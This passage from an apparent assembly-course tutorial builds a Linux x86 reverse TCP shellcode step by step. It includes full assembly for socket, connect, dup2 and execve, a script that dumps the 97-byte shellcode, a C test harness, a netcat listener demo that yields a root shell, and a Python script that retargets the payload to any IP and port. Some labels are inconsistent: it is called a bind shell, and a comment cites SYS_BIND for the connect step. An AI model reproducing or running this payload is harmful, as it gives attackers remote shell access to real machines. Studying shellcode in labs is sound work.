	; int socketcall(int call, unsigned long *args)
	; int socket(int domain, int type, int protocol)
	; EAX = socketcall()
	; EBX = SYS_SOCKET[1]
	; ECX = (int domain, int type, int protocol)
	xor    eax,eax	;
	mov    al,0x66	; setting syscall as socketcall() [REF1]
	xor    ebx,ebx	;
	push   ebx	; setting ECX param in memory - 0x0 (0 for tcp(7) stream sockets)	:	[socket_struct --> REF3]
	inc    ebx	; setting EBX 0x1 (socketcall: SYS_SOCKET[1]) 				:	[socketCall_struct --> REF4]
	push   ebx	; setting ECX param in memory - 0x1,0x0 (socket: SOCK_STREAM[1]) 	:	[socket --> REF2]
	push   0x2	; setting ECX param in memory - 0x2,0x1,0x0 (socket: AF_INET[2])	:	[socket --> REF2]
	mov    ecx,esp	; ECX points to args on stack for socket() 				:	[socket_struct --> REF3]
	int    0x80	; calling socketcalll(SYS_SOCKET, (socket(AF_INET, SOCK_STREAM, 0))	
	xor    esi,esi	;
	mov    esi,eax 	; save sockfd in ESI for future syscalls
```

## Connecting with our socket

Now that we have our socket, let's go ahead and give it the property to connect to another address.

In my case I wanted to set the inet_addr (IP) to 127.0.0.1, and sin_port (port) to 4444.

In C language that would look like this:
- ('127.0.0.1')
- sin_port(4444)


This can be achieved with the syscall "socketcalll(SYS_BIND,(ADDRESS-SYS_SOCKET-SOCKFD,ADDRESS-SYS_SOCKET-STRUCT,len(16),4444))".

In assembly that looks like this:


```
; [+] Setting up socketcall() for SYS_CONNECT
	; int socketcall(int call, unsigned long *args)
	; int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
	; EAX = socketcall
	; EBX = SYS_CONNECT[3]
	; ECX = (int sockfd, const struct sockaddr *addr, socklen_t addrlen) : 
	; Legend: If all set - 1(1,1,1). Else if not set 0(0,0,0)
	xor    eax,eax		;
	mov    al,0x66		; setting syscall as socketcall()					:	[vim /usr/include/i386-linux-gnu/asm/unistd_32.h]
	xor    ebx,ebx		; 
	mov    bl,0x3		; setting function as SYS_CONNECT					:	[socketcall --> REF1]
	xor    edx,edx		; 
	mov    edx, 0x04030382	; 127.0.0.1 flipped and converted is 0x100007f. But this will give us errors because of NULL bytes 
        sub    edx, 0x03030303	; so we put a larger number and subtract it down to 0x100007f		: 	[connect --> REF5]
	push   edx		; we then push it to stack which avoids the NULL break errors		:	[connect --> REF5]
	push   word 0x5c11	; 4444 flipped and hex encoded is 0x5c11 - pushed to stack		:	[connect --> REF5]
	push   word 0x2		; setting sa_family member of sockaddr to AF_INET (0x02)		:	[connect --> REF5]
	mov    edx,esp		; setting EDX to pointer of sockaddr struct				: 	[connect --> REF5]
	push   0x10		; pushing stocketlen_t addrlen onto stack - 0x10 == 16 bytes - 0(0,0,1)	:	[connect --> REF5]
	push   edx		; pushing address of sockaddr/struct to memory - 0(0,1,1)		:	[connect --> REF5]
	push   esi		; pushing sockfd onto stack - 0(1,1,1)					: 	[connect --> REF5]
	mov    ecx,esp		; setting ECX to address of parameters (located on stack) - 1(1,1,1)	:	[connect --> REF5]
	int    0x80		; calling socketcalll(SYS_CONNECT,(sockfd,(AF_INET(0x2),127.0.0.1,4444),addrlen(16 bytes))
```

## Setting stdin, stdout and stderr

So with most in not all *NIX systems, you have: stdin, stdout and stderr. The way systems interperet it is as integers: 0x0, 0x1, 0x2.
These 3 determine the accepted data streams. It's imperative that our shell accepts all 3 streams, so let's go ahead and do just that!

This can be achieved with the syscall "dup2(sockfd,(stderr,stdout,stdin))".

In assmebly that looks like this:

```
; [+] dup2(): setting stdin, stdout, stderr propterties to sockfd: (0x2,0x1,0x0)
        ; int dup2(int oldfd, int newfd);
        ; EAX = dup2
        ; EBX = sockfd
        ; ECX = (0x2,0x1,0x0)-1) decrementing loop
        xor    ecx,ecx  ; 
        mov    cl,0x2   ; loop counter for dup2. decrementing loop will look like: (0x2,0x1,0x00)
dup2_loop:
        push   0x3f     ; using push/pop this time for fun. same as using mov eax,0x3f          :       [vim /usr/include/i386-linux-gnu/asm/unistd_32.h]
        pop    eax      ; setting EAX to dup2() syscall                                         :       [dup2 --> REF6]
        int    0x80     ; [*] Calling: dup2(sockfd, (stderr,stdout,stdin))
        dec    ecx      ; decrementing loop counter for each iteration
        jns    dup2_loop;  loop up to dup2_loop if SF=0 (If ECX is positive int (SF=0) then loop, else if negative (0,-1 etc) then (SF=1) continue down)
```

## Our shell

We've got all our pieces in place now, all we need is to execute a shell on connection! 

This can be achieved with the syscall "execve(/bin//sh0x00)".

I think a nice simple "/bin/sh" will work perfectly for our needs.

In assmebly that looks like this:

```
; [+] execve(): executing /bin//sh      
        ; int execve(const char *pathname, char *const argv[], char *const envp[])
        ; EAX = execve
        ; EBX = /bin//sh
        ; ECX = args followed by 0x00
        xor    eax,eax          ;
        mov    al,11            ; setting EAX to execve syscall
        xor    ebx,ebx          ;
        push   ebx              ; execve requires NULLBYTE after arguments (0x00)               :       [execve --> REF7]
        push   0x68732f2f       ; sh//
        push   0x6e69622f       ; nib/ - Pushing /bin//sh onto stack in reverse for EBX         :       [execve --> REF7]
        mov    ebx,esp          ; setting EBX to address of /bin//sh
        xor    ecx,ecx          ;
        xor    esi,esi          ;
	xor    edx,edx
        int    0x80             ; [*] Calling: execve(/bin//sh0x00)
```

## Putting it all together

If you followed all the steps you should have an assembly file that looks similar to this:

```
global _start

section .text

_start:
;sys_socket:
	; [+] Setting up socketcall() for SYS_SOCKET
	; int socketcall(int call, unsigned long *args)
	; int socket(int domain, int type, int protocol)
	; EAX = socketcall()
	; EBX = SYS_SOCKET[1]
	; ECX = (int domain, int type, int protocol)
	xor    eax,eax	;
	mov    al,0x66	; setting syscall as socketcall() [REF1]
	xor    ebx,ebx	;
	push   ebx	; setting ECX param in memory - 0x0 (0 for tcp(7) stream sockets)	:	[socket_struct --> REF3]
	inc    ebx	; setting EBX 0x1 (socketcall: SYS_SOCKET[1]) 				:	[socketCall_struct --> REF4]
	push   ebx	; setting ECX param in memory - 0x1,0x0 (socket: SOCK_STREAM[1]) 	:	[socket --> REF2]
	push   0x2	; setting ECX param in memory - 0x2,0x1,0x0 (socket: AF_INET[2])	:	[socket --> REF2]
	mov    ecx,esp	; ECX points to args on stack for socket() 				:	[socket_struct --> REF3]
	int    0x80	; calling socketcalll(SYS_SOCKET, (socket(AF_INET, SOCK_STREAM, 0))	


save_sockfd:
	xor    esi,esi	;
	mov    esi,eax 	; save sockfd in ESI for future syscalls


sys_connect:
	; [+] Setting up socketcall() for SYS_CONNECT
	; int socketcall(int call, unsigned long *args)
	; int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
	; EAX = socketcall
	; EBX = SYS_CONNECT[3]
	; ECX = (int sockfd, const struct sockaddr *addr, socklen_t addrlen) : 
	; Legend: If all set - 1(1,1,1). Else if not set 0(0,0,0)
	xor    eax,eax		;
	mov    al,0x66		; setting syscall as socketcall()					:	[vim /usr/include/i386-linux-gnu/asm/unistd_32.h]
	xor    ebx,ebx		; 
	mov    bl,0x3		; setting function as SYS_CONNECT					:	[socketcall --> REF1]
	xor    edx,edx		; 
	mov    edx, 0x04030382	; 127.0.0.1 flipped and converted is 0x100007f. But this will give us errors because of NULL bytes 
        sub    edx, 0x03030303	; so we put a larger number and subtract it down to 0x100007f		: 	[connect --> REF5]
	push   edx		; we then push it to stack which avoids the NULL break errors		:	[connect --> REF5]
	push   word 0x5c11	; 4444 flipped and hex encoded is 0x5c11 - pushed to stack		:	[connect --> REF5]
	push   word 0x2		; setting sa_family member of sockaddr to AF_INET (0x02)		:	[connect --> REF5]
	mov    edx,esp		; setting EDX to pointer of sockaddr struct				: 	[connect --> REF5]
	push   0x10		; pushing stocketlen_t addrlen onto stack - 0x10 == 16 bytes - 0(0,0,1)	:	[connect --> REF5]
	push   edx		; pushing address of sockaddr/struct to memory - 0(0,1,1)		:	[connect --> REF5]
	push   esi		; pushing sockfd onto stack - 0(1,1,1)					: 	[connect --> REF5]
	mov    ecx,esp		; setting ECX to address of parameters (located on stack) - 1(1,1,1)	:	[connect --> REF5]
	int    0x80		; calling socketcalll(SYS_CONNECT,(sockfd,(AF_INET(0x2),127.0.0.1,4444),addrlen(16 bytes))


dup2_setup:
	; [+] dup2(): setting stdin, stdout, stderr propterties to sockfd: (0x2,0x1,0x0)
	; int dup2(int oldfd, int newfd);
	; EAX = dup2
	; EBX = sockfd
	; ECX = (0x2,0x1,0x0)-1) decrementing loop
	xor    ecx,ecx	; 
	mov    cl,0x2	; loop counter for dup2. decrementing loop will look like: (0x2,0x1,0x00)
dup2_loop:
	push   0x3f	; using push/pop this time for fun. same as using mov eax,0x3f		:	[vim /usr/include/i386-linux-gnu/asm/unistd_32.h]
	pop    eax	; setting EAX to dup2() syscall						:	[dup2 --> REF6]
	int    0x80	; [*] Calling: dup2(sockfd, (stderr,stdout,stdin))
	dec    ecx	; decrementing loop counter for each iteration
	jns    dup2_loop;  loop up to dup2_loop if SF=0 (If ECX is positive int (SF=0) then loop, else if negative (0,-1 etc) then (SF=1) continue down)


ExecveShell:
	; [+] execve(): executing /bin//sh	
	; int execve(const char *pathname, char *const argv[], char *const envp[])
	; EAX = execve
	; EBX = /bin//sh
	; ECX = args followed by 0x00
	xor    eax,eax		;
	mov    al,11		; setting EAX to execve syscall
	xor    ebx,ebx		;
	push   ebx		; execve requires NULLBYTE after arguments (0x00)		:	[execve --> REF7]
	push   0x68732f2f 	; sh//
	push   0x6e69622f 	; nib/ - Pushing /bin//sh onto stack in reverse for EBX		:	[execve --> REF7]
	mov    ebx,esp		; setting EBX to address of /bin//sh
	xor    ecx,ecx		;
	xor    esi,esi		;
	xor    edx,edx
	int    0x80		; [*] Calling: execve(/bin//sh0x00)
```

If you didn't you do now!

For your own sake, make sure you read over it and fully understand it. It'll help you to understand how it works on a fundamental level.


## Testing our bind shell

So if you're not aware we can't just run assembly from the file, it first needs to be compile and then linked.

During my testing I went ahead and created a file that foes all this along with dumping the shellcode of the compiled file. Please use it to compile your assembly file:
```
# This compiles your assembly code and dumps the shellcode 

# Compile and output
nasm -f elf32 -o $1.o $1.asm; ld -d -o $1 $1.o

# Gets shellcode from output file

## Prints the shellcode in little endian

RAW=$(objdump -d "$1" | grep "^ "|awk -F"[\t]" '{print $2}')
SHELLCODE=""
COUNT=0
for word in $RAW
do
	SHELLCODE=${SHELLCODE}${word:6:2}${word:4:2}${word:2:2}${word:0:2}
	((COUNT++))
done
echo ""
echo "Shellcode: "
echo $SHELLCODE | sed 's/ //g'| sed 's/.\{2\}/\\x&/g'|paste -d '' -s
echo "Shellcode size: ${COUNT} bytes"
```


You then pass the name (NOT INCLUDING EXTENSION) as an argument to the bash file to compile and like it like so:

```
root@ubuntu:/mnt/hgfs/assembly/exam/2-Assignment# ./compile-shell-dump.sh reverse_shell_tcp

Shellcode: 
\x31\xc0\xb0\x66\x31\xdb\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x31\xf6\x89\xc6\x31\xc0\xb0\x66\x31\xdb\xb3\x03\x31\xd2\xba\x82\x03\x03\x04\x81\xea\x03\x03\x03\x03\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe2\x6a\x10\x52\x56\x89\xe1\xcd\x80\x31\xc9\xb1\x02\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xf6\x31\xd2\xcd\x80
Shellcode size: 97 bytes
root@ubuntu:/mnt/hgfs/assembly/exam/2-Assignment# ls
compile-shell-dump.sh  reverse_shell_tcp  reverse_shell_tcp.asm  reverse_shell_tcp.o
root@ubuntu:/mnt/hgfs/assembly/exam/2-Assignment#
```

Now we'll take the dumped shellcode and place it in a C file, we do this to confirm it works in a C program.

```
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\xb0\x66\x31\xdb\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x31\xf6\x89\xc6\x31\xc0\xb0\x66\x31\xdb\xb3\x03\x31\xd2\xba\x82\x03\x03\x04\x81\xea\x03\x03\x03\x03\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe2\x6a\x10\x52\x56\x89\xe1\xcd\x80\x31\xc9\xb1\x02\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xf6\x31\xd2\xcd\x80";


main(){

        printf("Shellcode Length: %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```

Once that's done we're going to need to compile it:
```
root@ubuntu:/mnt/hgfs/assembly/exam/2-Assignment/# gcc -fno-stack-protector -z execstack testingShellcode.c -o testingShellcode
```

And we're done!

## Testing our shell

To test our shell open a new terminal and enter the following command (If you used a different port make sure to use it here instead of 4444)

This shell command will open a TCP socket connection on the specified port.

```
nc -v -l 4444
```

The terminal will hang in a listeneing state until it receives a connection on that port.


Now in a separate terminal let's run our compiled shellcode!

```
root@ubuntu:/mnt/hgfs/assembly/exam/2-Assignment/testShellcode# ./testingShellcode
Shellcode Length: 97

```

It should hang like our previous command, but if we go back to our listener...

You can see we have a shell!

```
root@ubuntu:/home/ubuntu# nc -v -l 4444
Connection from 127.0.0.1 port 4444 [tcp/*] accepted
id
uid=0(root) gid=0(root) groups=0(root)
```

I hope you enjoyed learning how to create a simple shell-bind-tcp using shellcode!

As an added bonus, I've included a python script that allows you to dynamically restructure shellcode to allow for the swapping of IP's and ports.

```
#!/usr/bin/python
import sys,socket

if len(sys.argv) != 3:
  print "Fail!"

ipbts           = bytearray(socket.inet_aton(sys.argv[1]))
incremented     = [b+1 for b in ipbts]
ip              = "".join(["\\x" + format(b, 'x') for b in incremented])
port_number     = int(sys.argv[2])
bts             = [port_number >> i & 0xff for i in (24,16,8,0)]
filtered        = [b for b in bts if b > 0]
formatted       = ["\\x" + format(b, 'x') for b in filtered]
port            = "".join(formatted)

shellcode ="\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x01\\x31\\xc9\\x51\\x53\\x6a\\x02\\x89\\xe1"
shellcode+="\\xcd\\x80\\x31\\xff\\x89\\xc7\\x31\\xc0\\xb0\\x66\\x31\\xc9\\xb9"
print("Ip is: ")
print(ip)
shellcode+= ip # "\\x80\\x01\\x01\\x02"
shellcode+="\\x81\\xe9\\x01\\x01\\x01\\x01\\x51\\x66\\x68"
print("Port is: ")
print(port)
shellcode+= port
shellcode+="\\x43\\x66\\x53\\x89"
shellcode+="\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\x43\\xcd\\x80\\x31\\xc9\\xb1\\x02\\x31\\xc0"
shellcode+="\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\xb0\\x0b\\x31\\xdb\\x53\\x68\\x2f"
shellcode+="\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80";

print(shellcode)
```
```
root@ubuntu:/mnt/hgfs/assembly/exam/2-Assignment# python ip-port-changer.py 127.0.0.1 4444
Ip is: 
\x80\x1\x1\x2
Port is: 
\x11\x5c
\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x31\xff\x89\xc7\x31\xc0\xb0\x66\x31\xc9\xb9\x80\x1\x1\x2\x81\xe9\x01\x01\x01\x01\x51\x66\x68\x11\x5c\x43\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\x43\xcd\x80\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80
```


# Working on it.....

